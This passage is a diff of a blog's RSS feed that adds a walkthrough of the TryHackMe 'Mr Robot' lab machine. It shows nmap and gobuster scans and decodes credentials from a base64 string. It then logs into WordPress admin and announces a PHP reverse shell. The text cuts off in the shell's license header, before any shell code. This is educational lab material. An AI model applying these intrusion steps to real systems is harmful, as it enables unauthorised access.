@@ -1,4 +1,646 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Blogs on crazyc4t's blog</title><link>https://crazyc4t.xyz/blog/</link><description>Recent content in Blogs on crazyc4t's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 05 Nov 2022 13:17:13 -0500</lastBuildDate><atom:link href="https://crazyc4t.xyz/blog/index.xml" rel="self" type="application/rss+xml"/><item><title>Deep dive into nmap</title><link>https://crazyc4t.xyz/blog/nmap/</link><pubDate>Sat, 05 Nov 2022 13:17:13 -0500</pubDate><guid>https://crazyc4t.xyz/blog/nmap/</guid><description>&lt;img src="https://crazyc4t.xyz/images/nmaplogo.jpg" alt="Featured image of post Deep dive into nmap" />&lt;p>When it comes to hacking, knowledge is power, the more you know, the more options you have to attack, making critical a proper enumeration before any type of exploitation.&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Blogs on crazyc4t's blog</title><link>https://crazyc4t.xyz/blog/</link><description>Recent content in Blogs on crazyc4t's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 06 Nov 2022 08:42:00 -0500</lastBuildDate><atom:link href="https://crazyc4t.xyz/blog/index.xml" rel="self" type="application/rss+xml"/><item><title>Mr Robot CTF</title><link>https://crazyc4t.xyz/blog/mrrobot/</link><pubDate>Sun, 06 Nov 2022 08:42:00 -0500</pubDate><guid>https://crazyc4t.xyz/blog/mrrobot/</guid><description>&lt;img src="https://crazyc4t.xyz/images/fsociety.jpg" alt="Featured image of post Mr Robot CTF" />&lt;p>&lt;img src="https://crazyc4t.xyz/images/mrrobot.png"
+loading="lazy"
+alt="head"
+>&lt;/p>
+&lt;p>Welcome to a new machine walkthrough!&lt;/p>
+&lt;p>Now it&amp;rsquo;s the time for this awesome machine that is the &lt;a class="link" href="https://tryhackme.com/room/mrrobot" target="_blank" rel="noopener"
+>Mr Robot&lt;/a> room in Try Hack Me!&lt;/p>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;p>First my own methodology that I&amp;rsquo;m working with is to make Nmap scans, while doing some gobuster&amp;rsquo;s directories discoveries, so let&amp;rsquo;s go step by step.&lt;/p>
+&lt;h3 id="nmap">Nmap&lt;/h3>
+&lt;p>&lt;code>sudo nmap -sS -Pn -T5 -p- -vvv --open 10.10.112.68 -oG allPorts&lt;/code>
+&lt;img src="https://crazyc4t.xyz/images/mrrobot1.png"
+loading="lazy"
+alt="mrrobot1"
+>
+With the &lt;code>-vvv&lt;/code> triple verbosity flag we know already open ports without the scan being finished, giving us a bit of time to work.&lt;/p>
+&lt;h3 id="gobuster">Gobuster&lt;/h3>
+&lt;p>&lt;code>gobuster dir --url http://10.10.255.165 -t 40 -w /usr/share/dirb/wordlists/common.txt --no-error --output directories.txt&lt;/code>&lt;/p>
+&lt;p>While scanning, let&amp;rsquo;s take a look on the little details, Mr &lt;strong>Robot&lt;/strong> hmmm, shouldn&amp;rsquo;t be there some type of &lt;strong>robots.txt&lt;/strong>?&lt;/p>
+&lt;p>Giving the result of http://10.10.32.149/robots.txt:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">User-agent: *
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fsocity.dic
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">key-1-of-3.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Remember that robots.txt is a file made for making directories of a website not visible by a search engine.&lt;/p>
+&lt;p>So with that said, we curled those up and we get the first flag!&lt;/p>
+&lt;p>&lt;code>curl http://10.10.32.149/fsociety.dic&lt;/code>
+&lt;code>curl http://10.10.32.149/key-1-of-3.txt&lt;/code>&lt;/p>
+&lt;p>Finishing up with gobuster, we get the results:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">/.htaccess &lt;span class="o">[&lt;/span>Size: 218&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/.hta &lt;span class="o">[&lt;/span>Size: 213&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/.htpasswd &lt;span class="o">[&lt;/span>Size: 218&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/0 &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/0/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/admin &lt;span class="o">[&lt;/span>Size: 234&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/admin/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/audio &lt;span class="o">[&lt;/span>Size: 234&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/audio/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/atom &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/feed/atom/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/blog &lt;span class="o">[&lt;/span>Size: 233&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/blog/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/css &lt;span class="o">[&lt;/span>Size: 232&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/css/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/dashboard &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/wp-admin/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/favicon.ico &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/feed &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/feed/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/images &lt;span class="o">[&lt;/span>Size: 235&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/images/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/image &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/image/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/Image &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/Image/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/index.html &lt;span class="o">[&lt;/span>Size: 1188&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/index.php &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/intro &lt;span class="o">[&lt;/span>Size: 516314&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/js &lt;span class="o">[&lt;/span>Size: 231&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/js/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/license &lt;span class="o">[&lt;/span>Size: 309&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/login &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/wp-login.php&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/phpmyadmin &lt;span class="o">[&lt;/span>Size: 94&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/readme &lt;span class="o">[&lt;/span>Size: 64&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/rdf &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/feed/rdf/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/robots.txt &lt;span class="o">[&lt;/span>Size: 41&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/robots &lt;span class="o">[&lt;/span>Size: 41&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/rss &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/feed/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/rss2 &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/feed/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/sitemap &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/sitemap.xml &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/video &lt;span class="o">[&lt;/span>Size: 234&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/video/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-admin &lt;span class="o">[&lt;/span>Size: 237&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/wp-admin/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-content &lt;span class="o">[&lt;/span>Size: 239&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/wp-content/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-includes &lt;span class="o">[&lt;/span>Size: 240&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/wp-includes/&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-config &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-cron &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-links-opml &lt;span class="o">[&lt;/span>Size: 227&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-load &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-login &lt;span class="o">[&lt;/span>Size: 2606&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-mail &lt;span class="o">[&lt;/span>Size: 3064&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-settings &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-signup &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.10.32.149/wp-login.php?action&lt;span class="o">=&lt;/span>register&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/xmlrpc.php &lt;span class="o">[&lt;/span>Size: 42&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And we get tons of directories! we see repeating a lot the&lt;code>wp&lt;/code> keyword, and that&amp;rsquo;s because it&amp;rsquo;s a wordpress site! So now we know what is our target, but let&amp;rsquo;s get more knowledge about the directories of the page, since we got a dictionary from the &lt;code>robots.txt&lt;/code> file, we can do another gobuster scan:
+&lt;code>gobuster dir --url http://10.10.32.149 -t 40 -w fsocity.dic -no-error --output fsocietyScan.txt&lt;/code>&lt;/p>
+&lt;p>While that&amp;rsquo;s finishing, let&amp;rsquo;s go into some of this directories, let&amp;rsquo;s go to license:
+&lt;img src="https://crazyc4t.xyz/images/mrrobot2.png"
+loading="lazy"
+alt="mrrobot2"
+>&lt;/p>
+&lt;p>And we found something funny, with a base 64 attached, who is the script kitty now huh? Let&amp;rsquo;s get to decoding, I like this website for anything related to base64: &lt;a class="link" href="https://www.base64decode.org/" target="_blank" rel="noopener"
+>https://www.base64decode.org/&lt;/a>&lt;/p>
+&lt;p>The result of the decode is: &lt;code>elliot:ER28-0652&lt;/code>&lt;/p>
+&lt;p>Giving us a user for the wordpress site, but let&amp;rsquo;s not go to there yet, there&amp;rsquo;s more to discover, so check those directories that gave us the gobuster scan.&lt;/p>
+&lt;p>Although I was seeing my scan of the &lt;code>fsociety.dic&lt;/code> and I didn&amp;rsquo;t knew why it was taking so long, but is because the dictionary is over 800000 WORDS LONG! So no way I&amp;rsquo;m going to scan through the whole dictionary, so I terminated the scan.&lt;/p>
+&lt;h2 id="getting-in-depth">Getting in-depth&lt;/h2>
+&lt;p>Let&amp;rsquo;s go to the wordpress admin panel (&lt;code>/wp-admin&lt;/code>) and enter the elliot credentials, having acces to the panel!&lt;/p>
+&lt;p>On the bottom of the page we have the wordpress version, so let&amp;rsquo;s make a quick google about if there&amp;rsquo;s some exploits on that specific version of wordpress (4.3.1)&lt;/p>
+&lt;p>Giving us as a search result a exploit database link: &lt;a class="link" href="https://www.exploit-db.com/exploits/50255" target="_blank" rel="noopener"
+>https://www.exploit-db.com/exploits/50255&lt;/a> where it says it has a RCE vulnerability (Remote Code Execution) from the wordpress admin panel (which we have access to), but before everything let&amp;rsquo;s poke around the admin panel.
+&lt;img src="https://crazyc4t.xyz/images/mrrobot3.png"
+loading="lazy"
+alt="mrrobot3"
+>&lt;/p>
+&lt;p>This gives us more information about the users that are available in the wordpress site, now let&amp;rsquo;s get into exploiting.&lt;/p>
+&lt;h2 id="exploit">Exploit&lt;/h2>
+&lt;p>As we already know, wordpress is built with PHP, that is a back-end programming language, meaning that handles the server side of things, so we need to find a way to upload a exploit that can give us a reverse shell, and there&amp;rsquo;s a github repo with a php exploit here: &lt;a class="link" href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener"
+>https://github.com/pentestmonkey/php-reverse-shell&lt;/a>&lt;/p>
+&lt;p>This is the exploit we are going to use:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;span class="lnt">126
+&lt;/span>&lt;span class="lnt">127
+&lt;/span>&lt;span class="lnt">128
+&lt;/span>&lt;span class="lnt">129
+&lt;/span>&lt;span class="lnt">130
+&lt;/span>&lt;span class="lnt">131
+&lt;/span>&lt;span class="lnt">132
+&lt;/span>&lt;span class="lnt">133
+&lt;/span>&lt;span class="lnt">134
+&lt;/span>&lt;span class="lnt">135
+&lt;/span>&lt;span class="lnt">136
+&lt;/span>&lt;span class="lnt">137
+&lt;/span>&lt;span class="lnt">138
+&lt;/span>&lt;span class="lnt">139
+&lt;/span>&lt;span class="lnt">140
+&lt;/span>&lt;span class="lnt">141
+&lt;/span>&lt;span class="lnt">142
+&lt;/span>&lt;span class="lnt">143
+&lt;/span>&lt;span class="lnt">144
+&lt;/span>&lt;span class="lnt">145
+&lt;/span>&lt;span class="lnt">146
+&lt;/span>&lt;span class="lnt">147
+&lt;/span>&lt;span class="lnt">148
+&lt;/span>&lt;span class="lnt">149
+&lt;/span>&lt;span class="lnt">150
+&lt;/span>&lt;span class="lnt">151
+&lt;/span>&lt;span class="lnt">152
+&lt;/span>&lt;span class="lnt">153
+&lt;/span>&lt;span class="lnt">154
+&lt;/span>&lt;span class="lnt">155
+&lt;/span>&lt;span class="lnt">156
+&lt;/span>&lt;span class="lnt">157
+&lt;/span>&lt;span class="lnt">158
+&lt;/span>&lt;span class="lnt">159
+&lt;/span>&lt;span class="lnt">160
+&lt;/span>&lt;span class="lnt">161
+&lt;/span>&lt;span class="lnt">162
+&lt;/span>&lt;span class="lnt">163
+&lt;/span>&lt;span class="lnt">164
+&lt;/span>&lt;span class="lnt">165
+&lt;/span>&lt;span class="lnt">166
+&lt;/span>&lt;span class="lnt">167
+&lt;/span>&lt;span class="lnt">168
+&lt;/span>&lt;span class="lnt">169
+&lt;/span>&lt;span class="lnt">170
+&lt;/span>&lt;span class="lnt">171
+&lt;/span>&lt;span class="lnt">172
+&lt;/span>&lt;span class="lnt">173
+&lt;/span>&lt;span class="lnt">174
+&lt;/span>&lt;span class="lnt">175
+&lt;/span>&lt;span class="lnt">176
+&lt;/span>&lt;span class="lnt">177
+&lt;/span>&lt;span class="lnt">178
+&lt;/span>&lt;span class="lnt">179
+&lt;/span>&lt;span class="lnt">180
+&lt;/span>&lt;span class="lnt">181
+&lt;/span>&lt;span class="lnt">182
+&lt;/span>&lt;span class="lnt">183
+&lt;/span>&lt;span class="lnt">184
+&lt;/span>&lt;span class="lnt">185
+&lt;/span>&lt;span class="lnt">186
+&lt;/span>&lt;span class="lnt">187
+&lt;/span>&lt;span class="lnt">188
+&lt;/span>&lt;span class="lnt">189
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// This tool may be used for legal purposes only. Users take full responsibility
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// for any actions performed using this tool. The author accepts no liability
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// for damage caused by this tool. If these terms are not acceptable to you, then
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// do not use this tool.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// In all other respects the GPL version 2 applies:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// This program is free software; you can redistribute it and/or modify
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// it under the terms of the GNU General Public License version 2 as
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// published by the Free Software Foundation.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// This program is distributed in the hope that it will be useful,
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// but WITHOUT ANY WARRANTY; without even the implied warranty of
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
